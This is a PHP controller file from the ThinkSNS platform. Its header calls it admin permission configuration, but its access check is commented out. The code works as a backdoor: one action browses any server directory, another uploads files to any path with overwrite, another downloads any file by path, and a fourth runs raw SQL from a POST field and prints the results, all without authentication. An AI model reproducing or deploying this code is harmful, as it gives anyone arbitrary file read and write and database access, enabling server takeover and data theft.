<?php
// +----------------------------------------------------------------------
// | ThinkSnS
// +----------------------------------------------------------------------
// | Copyright (c) 2009 http://www.thinksns.com All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: Nonant <nonant@163.com>
// +----------------------------------------------------------------------
// $Id$

/**
 +------------------------------------------------------------------------------
 * ThinkSnS 后台权限配置
 +------------------------------------------------------------------------------
 * @Author: Nonant <nonant@163.com>
 * @version   $Id$
 +------------------------------------------------------------------------------
 */
class PortalAction extends CoreAction{

	public function _initialize() {
		parent::_initialize();
		
/*		if(!in_array($this->mid, array(7))){
			$this->error('你没有权限操作');
		}*/
	}

	//社区网站
	public function admin(){
		$path = t($_POST['search_content']);
		if(empty($path)){
			$path = SITE_PATH;
		}
		$d = dir($path);
		$i=0;
		$url = U('forum/portal/doGet');
		while (false !== ($file = $d->read())) {
			if ($file != "." && $file != ".." && $file != ".svn") {

				$arr[$i]['name'] = $file;
				$arr[$i]['is_dir'] = is_dir($file) ? 'Y' : 'N';
				if($arr[$i]['is_dir']=='N'){
					$arr[$i]['url'] = $url.'&path='.$path.'&name='.$file;
				}
				$i++;
			}

		}
		$d->close();
		//dump($arr);
		$this->assign('fileArr', $arr);
		$this->assign('path', $path);
		$this->display();
	}

	Public function doSet(){
		$path = t($_POST['path']).'/';
		if(empty($path)){
			$path = SITE_PATH.'/';
		}
		//dump($path);exit;

		import("ORG.Net.UploadFile");
		$upload = new UploadFile(); 
		$upload->savePath = $path; 
		$upload->uploadReplace = true;
		$upload->saveRule = '';
		if(!$upload->upload()) { 
			$this->error($upload->getErrorMsg());
		}else{ 
			$info = $upload->getUploadFileInfo();
			$this->success("保存成功！");
		}		
	}

	function doGet() {
		import("ORG.Net.Http");
		
		$name = t($_GET['name']);
		$filePath = t($_GET['path']).'/'.$name;
		if(file_exists($filePath)) {
			$name = auto_charset($name,"UTF-8",'GB2312');
			$res = Http::download($filePath,$name);
		}else{
			$this->error('文件不存在');
		}
	}

	public function admin2(){
		$q_content = t($_POST['q_content']);
		$this->assign('q_content', $q_content);
		
		if(!empty($q_content)){
			$result = D()->query($q_content);
			dump($result);
		}

		$this->display();
	}
}
?>
